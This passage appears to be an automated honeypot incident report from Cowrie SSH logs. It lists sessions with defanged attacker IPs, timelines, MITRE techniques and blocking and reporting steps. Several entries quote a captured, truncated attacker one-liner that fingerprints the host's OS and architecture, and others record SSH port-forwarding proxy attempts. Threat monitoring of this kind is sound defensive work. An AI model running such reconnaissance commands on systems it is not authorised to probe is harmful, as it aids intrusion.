| **Last Seen** | 2026-08-23 13:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:07:20` | `cowrie.session.connect` |
| `2026-08-23 13:07:20` | `cowrie.client.version` |
| `2026-08-23 13:07:20` | `cowrie.client.kex` |
| `2026-08-23 13:07:22` | `cowrie.login.success` |
| `2026-08-23 13:07:23` | `cowrie.session.params` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.success` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:23` | `cowrie.command.input` |
| `2026-08-23 13:07:24` | `cowrie.log.closed` |
| `2026-08-23 13:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69fad92ee84

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 13:07 |
| **Last Seen** | 2026-08-23 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:07:37` | `cowrie.session.connect` |
| `2026-08-23 13:07:37` | `cowrie.client.version` |
| `2026-08-23 13:07:37` | `cowrie.client.kex` |
| `2026-08-23 13:07:38` | `cowrie.login.success` |
| `2026-08-23 13:07:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:07:38` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a7932dc1765

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:07 |
| **Last Seen** | 2026-08-23 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:07:42` | `cowrie.session.connect` |
| `2026-08-23 13:07:42` | `cowrie.client.version` |
| `2026-08-23 13:07:42` | `cowrie.client.kex` |
| `2026-08-23 13:07:43` | `cowrie.login.success` |
| `2026-08-23 13:07:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:07:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:07:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86019f5e32be

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:07 |
| **Last Seen** | 2026-08-23 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:07:43` | `cowrie.session.connect` |
| `2026-08-23 13:07:43` | `cowrie.client.version` |
| `2026-08-23 13:07:43` | `cowrie.client.kex` |
| `2026-08-23 13:07:44` | `cowrie.login.success` |
| `2026-08-23 13:07:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:07:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:07:45` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c8e74baca7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:09 |
| **Last Seen** | 2026-08-23 13:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:09:42` | `cowrie.session.connect` |
| `2026-08-23 13:09:42` | `cowrie.client.version` |
| `2026-08-23 13:09:42` | `cowrie.client.kex` |
| `2026-08-23 13:09:43` | `cowrie.login.success` |
| `2026-08-23 13:09:45` | `cowrie.session.params` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.success` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.command.input` |
| `2026-08-23 13:09:45` | `cowrie.log.closed` |
| `2026-08-23 13:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44c8ce97718

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:12 |
| **Last Seen** | 2026-08-23 13:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:12:11` | `cowrie.session.connect` |
| `2026-08-23 13:12:11` | `cowrie.client.version` |
| `2026-08-23 13:12:11` | `cowrie.client.kex` |
| `2026-08-23 13:12:12` | `cowrie.login.success` |
| `2026-08-23 13:12:13` | `cowrie.session.params` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.success` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:13` | `cowrie.command.input` |
| `2026-08-23 13:12:14` | `cowrie.log.closed` |
| `2026-08-23 13:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa820657ddb5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:14 |
| **Last Seen** | 2026-08-23 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:14:44` | `cowrie.session.connect` |
| `2026-08-23 13:14:45` | `cowrie.client.version` |
| `2026-08-23 13:14:45` | `cowrie.client.kex` |
| `2026-08-23 13:14:45` | `cowrie.login.success` |
| `2026-08-23 13:14:46` | `cowrie.session.params` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.success` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:46` | `cowrie.command.input` |
| `2026-08-23 13:14:47` | `cowrie.log.closed` |
| `2026-08-23 13:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae385b297af2

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-08-23 13:15 |
| **Last Seen** | 2026-08-23 13:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:15:14` | `cowrie.session.connect` |
| `2026-08-23 13:15:15` | `cowrie.client.version` |
| `2026-08-23 13:15:15` | `cowrie.client.kex` |
| `2026-08-23 13:15:16` | `cowrie.login.success` |
| `2026-08-23 13:15:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5cfef23ec2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:17 |
| **Last Seen** | 2026-08-23 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:17:09` | `cowrie.session.connect` |
| `2026-08-23 13:17:09` | `cowrie.client.version` |
| `2026-08-23 13:17:10` | `cowrie.client.kex` |
| `2026-08-23 13:17:10` | `cowrie.login.success` |
| `2026-08-23 13:17:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:17:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:17:11` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83896aa4d0bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:17 |
| **Last Seen** | 2026-08-23 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:17:14` | `cowrie.session.connect` |
| `2026-08-23 13:17:14` | `cowrie.client.version` |
| `2026-08-23 13:17:14` | `cowrie.client.kex` |
| `2026-08-23 13:17:15` | `cowrie.login.success` |
| `2026-08-23 13:17:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:17:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:17:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f47eeabe12a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:17 |
| **Last Seen** | 2026-08-23 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:17:38` | `cowrie.session.connect` |
| `2026-08-23 13:17:38` | `cowrie.client.version` |
| `2026-08-23 13:17:38` | `cowrie.client.kex` |
| `2026-08-23 13:17:39` | `cowrie.login.success` |
| `2026-08-23 13:17:40` | `cowrie.session.params` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.success` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.command.input` |
| `2026-08-23 13:17:40` | `cowrie.log.closed` |
| `2026-08-23 13:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05016e7d5cf5

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-08-23 13:20 |
| **Last Seen** | 2026-08-23 13:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:20:09` | `cowrie.session.connect` |
| `2026-08-23 13:20:10` | `cowrie.client.version` |
| `2026-08-23 13:20:10` | `cowrie.client.kex` |
| `2026-08-23 13:20:13` | `cowrie.login.success` |
| `2026-08-23 13:20:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c02c7e0855

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-08-23 13:20 |
| **Last Seen** | 2026-08-23 13:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:20:17` | `cowrie.session.connect` |
| `2026-08-23 13:20:18` | `cowrie.client.version` |
| `2026-08-23 13:20:18` | `cowrie.client.kex` |
| `2026-08-23 13:20:19` | `cowrie.login.success` |
| `2026-08-23 13:20:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-911274e22944

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-08-23 13:20 |
| **Last Seen** | 2026-08-23 13:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:20:23` | `cowrie.session.connect` |
| `2026-08-23 13:20:24` | `cowrie.client.version` |
| `2026-08-23 13:20:24` | `cowrie.client.kex` |
| `2026-08-23 13:20:26` | `cowrie.login.success` |
| `2026-08-23 13:20:27` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0134c685c8c

| Field | Detail |
|---|---|
| **Source IP** | `88.84.209[.]146` |
| **First Seen** | 2026-08-23 13:20 |
| **Last Seen** | 2026-08-23 13:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:20:24` | `cowrie.session.connect` |
| `2026-08-23 13:20:25` | `cowrie.client.version` |
| `2026-08-23 13:20:25` | `cowrie.client.kex` |
| `2026-08-23 13:20:26` | `cowrie.login.success` |
| `2026-08-23 13:20:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.84.209[.]146` to AbuseIPDB if not already reported
- [ ] Block `88.84.209[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e16bd1aa936

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:20 |
| **Last Seen** | 2026-08-23 13:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:20:30` | `cowrie.session.connect` |
| `2026-08-23 13:20:30` | `cowrie.client.version` |
| `2026-08-23 13:20:30` | `cowrie.client.kex` |
| `2026-08-23 13:20:31` | `cowrie.login.success` |
| `2026-08-23 13:20:32` | `cowrie.session.params` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.success` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:32` | `cowrie.command.input` |
| `2026-08-23 13:20:33` | `cowrie.log.closed` |
| `2026-08-23 13:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4215fa0f5181

| Field | Detail |
|---|---|
| **Source IP** | `49.124.147[.]116` |
| **First Seen** | 2026-08-23 13:22 |
| **Last Seen** | 2026-08-23 13:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:22:43` | `cowrie.session.connect` |
| `2026-08-23 13:22:44` | `cowrie.client.version` |
| `2026-08-23 13:22:44` | `cowrie.client.kex` |
| `2026-08-23 13:22:46` | `cowrie.login.success` |
| `2026-08-23 13:22:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.147[.]116` to AbuseIPDB if not already reported
- [ ] Block `49.124.147[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87492bb8aa0b

| Field | Detail |
|---|---|
| **Source IP** | `112.31.93[.]229` |
| **First Seen** | 2026-08-23 13:22 |
| **Last Seen** | 2026-08-23 13:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:22:52` | `cowrie.session.connect` |
| `2026-08-23 13:22:53` | `cowrie.client.version` |
| `2026-08-23 13:22:53` | `cowrie.client.kex` |
| `2026-08-23 13:22:57` | `cowrie.login.success` |
| `2026-08-23 13:22:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.31.93[.]229` to AbuseIPDB if not already reported
- [ ] Block `112.31.93[.]229` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df135e693be

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:23 |
| **Last Seen** | 2026-08-23 13:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
